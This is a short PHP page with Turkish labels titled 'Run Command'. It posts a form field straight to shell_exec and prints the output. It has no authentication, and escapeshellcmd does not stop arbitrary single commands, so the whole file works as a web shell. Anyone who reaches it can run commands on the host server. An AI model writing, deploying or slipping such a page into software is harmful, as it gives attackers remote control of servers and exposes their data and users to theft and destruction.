<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Kullanıcıdan gelen komutu al
    $command = escapeshellcmd($_POST['command']);
    
    // Komutu terminalde çalıştır ve çıktıyı al
    $output = shell_exec($command);

    // Çıktıyı sayfada göster
    echo "<pre>$output</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Komut Çalıştır</title>
</head>
<body>
    <h1>Komut Çalıştır</h1>
    <form method="post" action="">
        <label for="command">Komut:</label>
        <input type="text" id="command" name="command" required>
        <button type="submit">Çalıştır</button>
    </form>
</body>
</html>
